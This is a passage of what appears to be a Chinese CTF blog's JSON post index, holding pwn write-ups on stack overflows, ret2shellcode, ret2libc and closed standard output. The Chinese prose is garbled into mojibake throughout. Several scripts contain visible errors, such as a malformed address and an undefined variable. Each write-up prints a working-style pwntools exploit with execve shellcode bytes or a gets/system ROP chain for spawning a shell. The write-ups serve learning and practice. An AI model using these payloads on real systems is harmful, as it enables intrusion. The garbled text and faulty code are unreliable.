è€Œæˆ‘ä»¬ç”¨shellcraftç”Ÿæˆçš„shellcodeæ—¶44å­—èŠ‚çš„ï¼Œæ˜¾ç„¶å·²ç»è¶…è¿‡äº†äºæ˜¯æˆ‘ä»¬æƒ³æ‰¾ä¸€ä¸ªé•¿åº¦è¾ƒå°çš„shellcodeæ¥å†™å…¥ï¼Œä½†æ˜¯ç”±äºæŸäº›æˆ‘è¿˜æ²¡æå¾ˆæ‡‚çš„åŸå› ï¼Œæˆ‘ä»¬å¿…é¡»è¦å°†æŠŠshellcodeæ”¾åœ¨è¿”å›åœ°å€çš„åé¢é‚£æ”¾åœ¨åé¢çš„è¯æ˜¯ä¸æ˜¯44å­—èŠ‚çš„shellcodeå°±å¯ä»¥ä½¿ç”¨äº†å‘¢ï¼Ÿå…¶å®ä¹Ÿä¸è¡Œï¼Œè¦æ³¨æ„åˆ°readå‡½æ•°æ˜¯è¯»å–0x40å­—èŠ‚çš„ï¼Œè¿™å°±ä½¿å¾—è¯»å–çš„å­—ç¬¦ä¸²é•¿åº¦æœ‰ä¸€å®šçš„é™åˆ¶ã€‚è¿™0x40å­—èŠ‚çš„æ•°æ®ï¼Œæ—¢è¦åŒ…æ‹¬å¡«å……çš„åƒåœ¾æ•°æ®ï¼Œä¹Ÿè¦åŒ…æ‹¬shellcodeçš„è¿”å›åœ°å€å’Œshellcodeçš„å†…å®¹ï¼Œæˆ‘ä»¬è¿˜å¾—è®¡ç®—ä¸€ä¸‹å…è®¸çš„shellcodeçš„é•¿åº¦0x40 - ( 0x10 + 8 ) - 8 = 32ï¼ˆ0x10+8ï¼‰ä¸ºé€ æˆæº¢å‡ºå¡«å……çš„åƒåœ¾æ•°æ®ï¼Œåé¢8ä¸ºæ˜¯shellcodeåœ°å€çš„é•¿åº¦ï¼Œæ‰€ä»¥æ„å»ºçš„shllcodeå¿…é¡»åœ¨32ä»¥å†…ä¹‹å‰ä½¿ç”¨çš„shellcraft.sh()ç”Ÿæˆçš„shellcodeæœ‰44å­—èŠ‚ï¼Œåœ¨è¿™é‡Œåªæœ‰32å­—èŠ‚ï¼Œå› æ­¤å¹¶ä¸é€‚ç”¨ shellcode=â€\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05â€ ä¸€ä¸ªæ‰¾shellcodeçš„ç½‘ç«™ https://www.exploit-db.com/shellcodeshttp://shell-storm.org/shellcode/ è¿™ä¸ªshellcodeåªæœ‰23ä¸ªå­—èŠ‚ï¼ŒçŸ­å°ç²¾æ‚ï¼Œé€‚åˆæ”¾åœ¨æ ˆä¸­å»æ‰§è¡Œ å†™exp (å‘ç°ä¸€ä¸ªåœ°æ–¹ï¼šå°±æ˜¯æ­£å¸¸pythonä»£ç ä¸èƒ½åœ¨å¼€å¤´ç•™ç©ºæ ¼) from pwn import * p = process('./shellcode') p.recvuntil('[') addr = p.recvuntil(']', drop=True) p.recvuntil('Now give me your answer') shellcode=\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\" p.sendline(b'a'*24 + p64(int(addr,16)+32) + shellcode) p.interactive() è¿™é‡Œæˆ‘ä»¬åªçŸ¥é“ä¸€ä¸ªç¡®å®šçš„bufçš„addrï¼Œshellcodeçš„åœ°å€è¦ä»bufçš„åœ°å€æ¨å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯int(addr,16)+32 0x04ä¸ºä»€ä¹ˆä¸å¯ä»¥æ‰¾ä¸€ä¸ªé•¿åº¦å°äº24çš„shellcodeç›´æ¥å†™å…¥bufä¸­å‘¢ï¼Ÿè€Œéè¦å…ˆå¡«å……bufå†è¿”å›è‡³å†™shellcodeçš„åœ°æ–¹å‘¢ï¼Ÿåœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªè§£é‡Šä¸çŸ¥é“å¯¹ä¸å¯¹ å› ä¸ºå…¶æœ¬èº«æ˜¯æœ‰pushæŒ‡ä»¤çš„ï¼Œå¦‚æœæˆ‘ä»¬æŠŠshellcodeæ”¾åœ¨è¿”å›åœ°å€çš„å‰é¢ï¼Œåœ¨ç¨‹åºleaveçš„æ—¶å€™ä¼šç ´åshellcodeï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶æ”¾åœ¨åé¢","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week3 T3","slug":"week3-T3","date":"2023-01-15T14:41:45.000Z","updated":"2024-01-31T02:34:38.718Z","comments":true,"path":"posts/173614fe/","link":"","permalink":"http://lmarch2.github.io/posts/173614fe/","excerpt":"T3 ret2shellcode 1 (bssæ®µå†™å…¥) 2023-01-15WPctf-wiki pwnè€ƒç‚¹ï¼šæ ˆæº¢å‡º shellcode","text":"T3 ret2shellcode 1 (bssæ®µå†™å…¥) 2023-01-15WPctf-wiki pwnè€ƒç‚¹ï¼šæ ˆæº¢å‡º shellcode 0x01fileï¼Œchecksec â€”â€” 32bitï¼Œå•¥ä¿æŠ¤éƒ½æ²¡å¼€ 0x02IDAæŸ¥çœ‹æºç ï¼Œæ²¡æœ‰systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²å¹¶ä¸”å¯ä»¥çœ‹åˆ°ï¼Œmainå‡½æ•°ä¸­ï¼Œgetså‡½æ•°è¯»å–ç”¨æˆ·è¾“å…¥åˆ°å˜é‡sï¼Œstrcnpå°†sä¸­çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°buf2å¤„buf2å¹¶æ²¡æœ‰åœ¨mainå‡½æ•°ä¸­çœ‹åˆ°å®šä¹‰ï¼Œåº”è¯¥æ˜¯å…¨å±€å˜é‡ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹buf2åœ¨bssæ®µä¸­ 0x03é€šè¿‡vmmapæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹bssæ®µæ˜¯å¦å…·æœ‰å¯æ‰§è¡Œæƒé™rw-pï¼Œå¯è¯»å¯å†™ï¼ˆè¿™é‡Œæ“ä½œä¸Šè¦æ³¨æ„ä¸€ä¸‹ï¼Œvmmapçš„å‘½ä»¤è¦åœ¨ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨ï¼Œå¯ä»¥ç»™ç¨‹åºä¸‹æ–­ç‚¹æˆ–è€…ctrl+Cåœä½ç¨‹åºå†è¾“å‘½ä»¤ï¼‰ å‚è€ƒèµ„æ–™ 0x04æœ‰æ‰§è¡Œæƒé™çš„è¯å°±å¯ä»¥å‘bssæ®µå†™å…¥shellcodeäº†ï¼Œä¹‹åæ§åˆ¶ç¨‹åºè¿”å›æ‰§è¡Œshellcodeåœ¨å†™expä¹‹å‰è¿˜è¦å…ˆè®¡ç®—åç§»é‡ï¼Œæ–¹æ³•å’Œret2textç±»ä¼¼ï¼Œä¸ä¹‹å‰çš„åç§»é‡éƒ½æ˜¯ä¸€æ ·çš„ç”¨gdbè°ƒè¯•æˆ–è€…çˆ†ç ´æ±‚å‡ºåç§»é‡ä¸º112ä½¿ç”¨shellcraft.sh()ç”Ÿæˆshellcodeï¼Œå¹¶ä¸”ç”¨shellcode.ljust()æ–¹æ³•å‘å·¦å¯¹é½è¡¥é½å­—ç¬¦ä¸²ï¼Œæº¢å‡ºå¡«å……è¿”å›åœ°å€expä¸º from pwn import * p = process('./ret2shellcode') shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 p.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr)) p.interactive() 0x05å¥½åƒshellcodeå†™åœ¨æ ˆæˆ–è€…bssæ®µä¸Šéƒ½å¯ä»¥å§ï¼Ÿ ç½‘ä¸Šçœ‹åˆ°ä¸€ä¸ªè§£é‡Šè¯´ä¸èƒ½ç›´æ¥æŠŠshellcodeå†™åœ¨æ ˆä¸Šï¼Ÿä¸çŸ¥é“å¯¹ä¸å¯¹ï¼šç»å¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿéƒ½é»˜è®¤å¼€å¯ASLRä¿æŠ¤ï¼Œè¿™å¤§å¤§æé«˜äº†æ”»å‡»æ ˆçš„éš¾åº¦ã€‚å› æ­¤ï¼Œæ ˆåº”å½“æ˜¯æˆ‘ä»¬æœ€åè€ƒè™‘çš„å¯¹è±¡","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"ctf-wiki","slug":"ctf-wiki","permalink":"http://lmarch2.github.io/tags/ctf-wiki/"}]},{"title":"week3 T2","slug":"week3-T2","date":"2023-01-15T14:41:00.000Z","updated":"2024-01-31T02:34:32.445Z","comments":true,"path":"posts/60312468/","link":"","permalink":"http://lmarch2.github.io/posts/60312468/","excerpt":"T2 wustctf2020_closed 2023-01-15WPBUUCTF pwnè€ƒç‚¹ï¼šcloseå‡½æ•°","text":"T2 wustctf2020_closed 2023-01-15WPBUUCTF pwnè€ƒç‚¹ï¼šcloseå‡½æ•° 0x01åšäº†hgameçš„ç¬¬äºŒé¢˜åï¼Œå»è¡¥å……äº†ä¸€ä¸‹å…³äºcloseå‡½æ•°çš„çŸ¥è¯†ï¼Œå†ä»BUUCTFä¸­æ‰¾äº†ä¸€é¢˜ç»ƒäº†ç»ƒå…ˆfileçŸ¥é“æ—¶64-bit 0x02è¿™ä¸€é¢˜ç»“æ„å¾ˆç®€å•ï¼Œå†IDAä¸­ç›´æ¥èƒ½æ‰¾åˆ°åœ¨mainå‡½æ•°ä¸­çš„vulnerableå‡½æ•°ä¸­return shellå‡½æ•°ä¸­æœ‰systemå‡½æ•°ç›´æ¥ç»™å¥½äº† 0x03ä½†æ˜¯å› ä¸º close(1) close(2) å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºå…³é—­äº†ï¼Œè¿™æ ·åœ¨çª—å£ä¸Šçœ‹ä¸åˆ°è¾“å‡ºè¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬é‡æ–°å®šä½æ ‡å‡†è¾“å‡º 0x04è¡¥å……ä¸€äº›çŸ¥è¯† åœ¨Linuxä¸­çš„æ–‡ä»¶ï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰æ˜¯å†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ˆé€šå¸¸æ˜¯å°æ•´æ•°ï¼‰ï¼Œç”¨äºæŒ‡ä»£è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰€æœ‰æ‰§è¡ŒI/Oæ“ä½œçš„ç³»ç»Ÿè°ƒç”¨éƒ½é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ã€‚ç¨‹åºåˆšåˆšå¯åŠ¨çš„æ—¶å€™ï¼Œ0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œ1æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ2æ˜¯æ ‡å‡†é”™è¯¯ã€‚å¦‚æœæ­¤æ—¶å»æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦ä¼šæ˜¯3ã€‚ æ ‡å‡†è¾“å…¥è¾“å‡ºçš„æŒ‡å‘æ˜¯é»˜è®¤çš„ï¼Œä¹Ÿå°±æ˜¯é»˜è®¤æ‰“å¼€ä¸€ä¸ªç»ˆç«¯åï¼Œ0ï¼Œ1ï¼Œ2éƒ½æŒ‡å‘åŒä¸€ä¸ªä½ç½®ä¹Ÿå°±æ˜¯å½“å‰ç»ˆç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å®ƒä»¬çš„æŒ‡å‘ï¼Œä¹Ÿå³é‡å®šä½ æˆ‘ä»¬å¯ä»¥å°†æ ‡å‡†è¾“å‡ºè¿›è¡Œé‡å®šå‘ &amp;+æ–‡ä»¶æè¿°ç¬¦, å¯ä»¥æŒ‡ä»£è¯¥æ–‡ä»¶(è¿›ç¨‹) ç°åœ¨å¯ä»¥è§£å†³closeå‡½æ•°çš„é—®é¢˜äº†åœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œé¢, æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†è¾“å…¥çš„æŒ‡å‘éƒ½æ˜¯ç›¸åŒçš„ç»ˆç«¯. ç”±äºæ ‡å‡†è¾“å…¥æ²¡æœ‰è¢«ç¦ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤ exec 1&gt;&amp;0 è®©æ ‡å‡†è¾“å‡ºå®šä½åˆ°æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶ï¼Œä¹Ÿå°±ç›¸å½“äºé‡å¯äº†æ ‡å‡†è¾“å‡ºæœ¬è´¨ä¸Šå³exec+é‡å®šå‘å‘½ä»¤ï¼Œåªä¸è¿‡æ“ä½œçš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ç°åœ¨catåˆ°çš„flagå°±èƒ½å¤Ÿè¾“å‡ºäº†å‡ºé¢˜äººå¾ˆæœ‰æ„æ€ï¼Œè¿æ¥ä¸Šç¯å¢ƒç¬¬ä¸€ä»¶äº‹æ˜¯å˜²è®½ä¸€ä¸‹ä½  å‚è€ƒ æ–‡ç« ","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"week3 T1","slug":"week3-T1","date":"2023-01-15T01:32:24.000Z","updated":"2024-01-31T02:34:24.107Z","comments":true,"path":"posts/f93875d2/","link":"","permalink":"http://lmarch2.github.io/posts/f93875d2/","excerpt":"T1 easy_overflow 2023-01-14WPHgame week1 pwn ç¬¬äºŒé¢˜è€ƒç‚¹ï¼šç®€å•æ ˆæº¢å‡º","text":"T1 easy_overflow 2023-01-14WPHgame week1 pwn ç¬¬äºŒé¢˜è€ƒç‚¹ï¼šç®€å•æ ˆæº¢å‡º 0x01fileâ€”â€”64-bit,checksec å¼€å¯NX 0x02IDAçœ‹æºç ï¼Œå…ˆæ‰¾/bin/shï¼Œä¸€è·¯ç´¢å¼•è¿‡å»å‘ç°åœ¨ä¸€ä¸ªåé—¨å‡½æ•°ä¸­ ç„¶åæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯å…ˆè®°ä¸‹call systemçš„åœ°å€ï¼Œç»“æœä¸€çœ‹ï¼Œæ²¡æ‰¾åˆ°ï¼Ÿå–è€Œä»£ä¹‹çš„æ˜¯call sub_401060äºæ˜¯æˆ‘å¡äº†ä¸€ä¸‹ï¼Œå¯èƒ½æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™æ ·çš„é¢˜çš„ç¼˜æ•…ï¼Œæˆ‘æ²¡æœ‰æ„è¯†åˆ°å‡½æ•°åç§°å¯ä»¥æ˜¯ä¸ä¸€æ ·çš„æ‰“å¼€mainå‡½æ•°ä¼ªä»£ç ä¹Ÿæ˜¯è¿™æ ·â€¦â€¦è¶Šçœ‹è¶Šä¸å¯¹åŠ²ï¼Œæœç´¢èµ„æ–™æ‰å‘ç°è¿™ç§é¢˜çš„é£æ ¼å°±æ˜¯å»ç¬¦å·ä½¿åŸå‡½æ•°åå­—æ— æ³•æ˜¾ç¤ºè¿™ä¹ˆè¯´IDAæ— æ³•è§£å†³äº† 0x03æˆ‘ä»¬è½¬è€ŒåŠ¨æ€è°ƒè¯•è¯•ä¸€ä¸‹æˆ‘ä»¬å‡è®¾æ–‡ä»¶å¸¦æœ‰systemå‡½æ•°ï¼Œåˆæ®é¢˜æ„åº”è¯¥æ˜¯æœ‰getsæˆ–è€…readä¹‹ç±»çš„å‡½æ•°çš„è¿è¡Œæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹ç¡®å®å¦‚æ­¤é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™å‡ ä¸ªå‡½æ•°å¤„è¯•ç€æ‰“æ–­ç‚¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶ä¸­systemçš„åœ°å€å’Œåé¢å‡½æ•°ä¸­çš„call sub_401060çš„pltå¤„åœ°å€å¯¹ä¸Šäº†readå‡½æ•°çš„åœ°å€å’Œmainå‡½æ•°ä¸­çš„ call sub_401080çš„pltå¤„åœ°å€å¯¹ä¸Šäº†åŒæ—¶å‘¢ï¼Œgdbè¿è¡Œæ–‡ä»¶çš„æ—¶å€™è¿˜å‘ç°mainå‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ªcloseå‡½æ•°ï¼Œæµè§ˆä¸€ä¸‹mainå‡½æ•°æºç åªæœ‰sub_401070äº†æŸ¥é˜…äº†ä¸€äº›èµ„æ–™å¾—çŸ¥ï¼Œclose(1)å…³é—­äº†æ ‡å‡†è¾“å‡ºï¼Œè¯¦ç»†è§è¿™ç¯‡æ–‡ç« ä¹Ÿå°±æ˜¯æœ‰ä¸‹é¢æˆ‘ä»¬å¾—åˆ°shellåæ— æ³•åœ¨å±å¹•ä¸Šçœ‹åˆ°flagçš„æƒ…å†µè¿™æ—¶å€™å°±è¦è¾“å…¥exec 1&gt;&amp;0é‡å¯æ ‡å‡†è¾“å‡ºé‚£ä¹ˆç°åœ¨å‘¢æˆ‘ä»¬å·²ç»æŠŠæ–‡ä»¶é‡Œçš„å‡ ä¸ªä¸»è¦å‡½æ•°åˆ†æå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±è¦æ‰¾åç§»é‡äº† 0x03è¿™ä¸€éƒ¨åˆ†æˆ‘å‘ç°ä¸€ä¸ªå¾ˆå‘çš„åœ°æ–¹ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ctf-wilkiä¸Šçš„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨gdbè°ƒè¯•è®¾æ–­ç‚¹çš„æ—¶å€™å°±ä¸èƒ½è®¾ b read è¿™æ ·è®¾çš„è¯æˆ‘ä»¬ç›´æ¥å°±è¿›å…¥åˆ°readå‡½æ•°é‡Œäº†ï¼Œé‚£å°±æ— æ³•çœ‹åˆ°å‚¨å­˜æ•°æ®çš„å¯„å­˜å™¨ï¼ˆä¸ç®¡æ˜¯ä»€ä¹ˆï¼‰è·rspæˆ–è€…rbpçš„åç§»äº†å¹¶ä¸”ï¼Œæ­¤æ—¶å·²ç»å¼€å§‹è¿›å…¥readå­å‡½æ•°ï¼Œå³å·²ç»åˆ†é…äº†æ–°çš„æ ˆå¸§äº†ï¼Œrspå·²ç»ç§»åŠ¨ï¼Œå†å»è®¡ç®—rspå’Œrbpçš„å·®å€¼åˆ™ä¼šä¸å‡†ç¡® b *0x4011be æˆ‘ä»¬åº”è¯¥è¿™æ ·è®¾æ–­ç‚¹ï¼Œè¿™æ ·å°±åœæ­¢åœ¨è¿›å…¥readå‡½æ•°ä¹‹å‰ï¼Œä¸ä»…å¯ä»¥çœ‹åˆ°ç›¸å¯¹åç§»,è¿˜èƒ½è®¡ç®—å‡ºrbp-rspå¾—å‡ºrspå’Œrsi 0x7fffffffddd0,rbpä¸º0x7fffffffdde0,è®¡ç®—å¾—è·rbpåç§»é‡å°±ä¸º0x7fffffffdde0-0x7fffffffddd0é‚£ä¹ˆå†åŠ ä¸Šrbpæ±‚å¾—ä¸º0x10+8 è¿˜å¯ä»¥æš´åŠ›æ±‚å¾— æ‡’å¾—è®¡ç®—åç§»é‡çš„è¯ 0x04å¯ä»¥å†™exp from pwn import * p = remote(\"week-1.hgame.lwsec.cn\", 30574) system_addr = 000000000401176 payload = b ' a ' * 0x18 + p64(system_addr) p.sendline(payload) p.interactive() 0x05å¥½å¥‡æ€ªä¸ºä»€ä¹ˆå®˜æ–¹çš„WPå¯ä»¥ç›´æ¥åæ±‡ç¼–æˆæ­£å¸¸çš„å‡½æ•°ï¼Ÿæœäº†ä¸€ä¸‹å¥½åƒå¯ä»¥æ‰‹åŠ¨æ·»åŠ æ ‡ç­¾,è¿™ç¯‡æ–‡ç« æ•™äº†ä¸€ä¸‹è¿™ä¹ˆå›å¤åº“å‡½æ•°åï¼Œä½†æ˜¯çœ‹ä¸æ‡‚â€¦â€¦ 0x06å¾—åˆ°shellåå‘ç°å¹¶æ²¡æœ‰åŠæ³•æ˜¾ç¤ºå‡ºflagï¼Œé—®é¢˜å°±åœ¨ä¹‹å‰çš„é‚£ä¸ªclose(1)å› ä¸ºæ±‡ç¼–ä»£ç ä¸­æœ‰è¿™æ ·ä¸€å¥ mov edi, 1 æ‰€ä»¥è®¤ä¸ºclose()æ‹¬å·é‡Œçš„å‚æ•°æ—¶1è¿™æ—¶å€™éœ€è¦ä½¿ç”¨å‘½ä»¤è®©shellèƒ½å¤Ÿæ­£å¸¸å›æ˜¾ exec 1&gt;&amp;0 ç´¯æ­»äº†ï¼Œç»ˆäºæ‹¿åˆ°flag","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"hgame","slug":"hgame","permalink":"http://lmarch2.github.io/tags/hgame/"}]},{"title":"week2 T5","slug":"week2-T5","date":"2023-01-13T13:03:38.000Z","updated":"2024-01-31T02:34:16.034Z","comments":true,"path":"posts/46e9d6ae/","link":"","permalink":"http://lmarch2.github.io/posts/46e9d6ae/","excerpt":"T5 cgpwn2 2023-01-09WPæ”»é˜²ä¸–ç•Œ pwné¢˜","text":"T5 cgpwn2 2023-01-09WPæ”»é˜²ä¸–ç•Œ pwné¢˜ 0x01file checksecâ€”â€”32-bitï¼Œå¼€å¯NXä¿æŠ¤ 0x02IDAä¸­æ‰“å¼€windowå‘ç°è¿™é¢˜åˆæ˜¯ä¸€ä¸ªæ‰¾ä¸åˆ°/bin/shçš„ä½†æ˜¯åœ¨pwnå‡½æ•°ä¸­è¿˜æ˜¯æ‰¾åˆ°äº†systemå‡½æ•°çš„ç„¶åæˆ‘ä»¬æ¥çœ‹helloå‡½æ•°çš„åæ±‡ç¼–ä»£ç å¥½åƒæœ‰ç‚¹å¤æ‚ï¼Œç®€å•æ¥è¯´å°±æ˜¯å‰é¢å…ˆå®šä¹‰äº†ä¸€å †å˜é‡ï¼Œç„¶åæ¡ä»¶åˆ¤æ–­å…ˆä¸çœ‹äº†å…ˆçœ‹åé¢çš„é¦–å…ˆè¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåå­—ï¼Œé€šè¿‡fgetså‡½æ•°å®Œæˆï¼Œå¹¶ä¸”ä»é”®ç›˜æœ€å¤šåªèƒ½è¯»å–32hä¸ªå­—ç¬¦åˆ°nameç„¶åå†é€šè¿‡getså‡½æ•°ä»é”®ç›˜è¯»å–å­—ç¬¦åˆ°såŒºåŸŸï¼Œæ²¡æœ‰è¾“å…¥å­—ç¬¦æ•°é‡çš„é™åˆ¶å…¶ä¸­nameæ˜¯bssæ®µçš„ä¸€ä¸ªå¤§å°ä¸º34çš„åŒºåŸŸï¼Œsæ˜¯é•¿åº¦ä¸º0x26ä¸ªå­—èŠ‚çš„åŒºåŸŸäºæ˜¯æˆ‘ä»¬å¯ä»¥å‘nameåŒºåŸŸè¾“å…¥/bin/sh,ç„¶åè®©è¿™ä¸ªåœ°å€ä½œä¸ºsystemå‡½æ•°çš„å‚æ•°ï¼Œè€Œsåˆ™ç”¨æ¥è¿›è¡Œæ ˆæº¢å‡ºï¼Œå¹¶è®©æº¢å‡ºçš„è¿”å›åœ°å€ä¸ºsystemå‡½æ•°çš„åœ°å€ 0x03exp from pwn import * p = remote(â€™61.147.171.105â€˜ï¼Œ51582) target = 0x804855A binsh = 0x804A080 payload = b'a' * 0x26 +b 'bbbb' #è¦†ç›–så’Œebpçš„æ•°æ® + p32(target) + p32(binsh)#è¿”å›getså‡½æ•°çš„åœ°å€å’Œå‚æ•° a = r.recvuntil('e\\n') p.sendline('/bin/sh')#å‘fgetå‡½æ•°å‘é€å­—ç¬¦ä¸² a = r.recvuntil(':\\n')#ç­‰å¾…æ¥å—åˆ°æ‹¬å·å†…çš„ä¿¡æ¯åå†è¿è¡Œä¸‹é¢çš„å†…å®¹ p.sendline(payload)#å‘é€payload p.interactive() å¥½åƒä¸è¦a = r.recvuntil(â€˜e\\nâ€™)ï¼Œa = r.recvuntil(â€˜:\\nâ€™)ä¹Ÿå¯ä»¥â€¦â€¦","categories":[{"name":"å…¥é—¨é›†è®­wp","slug":"å…¥é—¨é›†è®­wp","permalink":"http://lmarch2.github.io/categories/%E5%85%A5%E9%97%A8%E9%9B%86%E8%AE%ADwp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"http://lmarch2.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"week2 T4","slug":"week2-T4","date":"2023-01-13T13:03:33.000Z","updated":"2024-01-31T02:34:07.946Z","comments":true,"path":"posts/31eee638/","link":"","permalink":"http://lmarch2.github.io/posts/31eee638/","excerpt":"T4 ret2libc2 2023-01-09WPctf-wiki åŸºç¡€rop","text":"T4 ret2libc2 2023-01-09WPctf-wiki åŸºç¡€rop 0x01file checksecâ€”â€”32-bitï¼Œå¼€å¯NX 0x02æ‹–å…¥IDAçœ‹çœ‹å±é™©å‡½æ•°å’Œret2libc1ç›¸åŒéƒ½æ˜¯getsä¸åŒçš„æ˜¯è¿™æ¬¡æ²¡æœ‰/bin/shç»™æˆ‘ä»¬ç”¨äº†æˆ‘è¿˜æ‰¾äº†å¥½ä¹…æ¥ç€â€¦â€¦ä½†æ˜¯systemå‡½æ•°è¿˜æ˜¯æœ‰çš„é‚£æˆ‘ä»¬å…ˆæ‰¾å‡ºsystemçš„åœ°å€0x08048490æ¥ä¸‹æ¥æˆ‘ä»¬å¾—æƒ³åŠæ³•å¼„å‡ºä¸ª/bin/shæ¥ç”±äºç¨‹åºå·²ç»å¼€å¯NXä¿æŠ¤ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥å†™å…¥æ ˆæ‰€ä»¥æ€è€ƒåœ¨bssæ®µå†™å…¥å­—ç¬¦ä¸² è¯´å®è¯ï¼Œè¿™ä¸ªåœ°æ–¹ç¬¬ä¸€æ¬¡çœ‹çœŸçš„æ€ä¹ˆéƒ½æƒ³ä¸åˆ°â€¦â€¦ç„¶åæ¥ä¸‹æ¥æˆ‘åˆä¸ä¼šäº†ï¼Œæ€ä¹ˆæ‰¾åˆ°bssâ€¦â€¦.åšå®¢ä¸Šå¥½å¤šæ–¹æ³•çœ‹å¾—æˆ‘å¤´æ™•ç›®çœ©ï¼Œåˆè¿˜ä¸ä¼šç”¨ROPgadgetâ€¦â€¦æœ€åæˆ‘ç›´æ¥åœ¨IDAé‡Œå¿«æ·é”®Gäº†ä¸€ä¸‹è·³åˆ°äº†.bssæ®µå‘ç°é‡Œé¢æœ‰ä¸ªbuff2(è®¾è®¡å¥½äº†çš„å§ï¼Ÿ)ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨getså‡½æ•°å†™å…¥/bin/shåˆ°buff2å»æ‰¾getsçš„åœ°å€ å¾—åˆ°0x8048460 0x03ç”¨gdbæš´åŠ›æ±‚å‡ºåç§»é‡ç»ˆäºå¯ä»¥å†™expäº† 0x04from pwn import * sh = process('./ret2libc2') gets_plt = 0x08048460 system_plt = 0x08048490 buf2 = 0x804a080 payload = flat( [b'a' * 112, gets_plt, system_plt, buf2,buf2]) #å…ˆè¦†ç›–æº¢å‡ºï¼Œè¿”å›getså‡½æ•°çš„åœ°å€ï¼Œ #æ¥ç€è¿”å›æ‰§è¡Œsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶åä¼ å…¥getså‡½æ•°å‚æ•°buf2çš„åœ°å€,systemå‡½æ•°çš„å‚æ•°buf2 sh.sendline(payload) sh.sendline('/bin/sh') sh.interactive() è¿™ç¯‡æ–‡ç« å’Œè¿™ç¯‡åšå®¢æŒºä¸é”™çš„è¿˜æœ‰è¿™ç¯‡ 0x05ctf-wikiçš„expæ˜¯ ##!/usr/bin/env python from pwn import * sh = process('./ret2libc2') gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]) sh.sendline(payload) sh.sendline('/bin/sh') 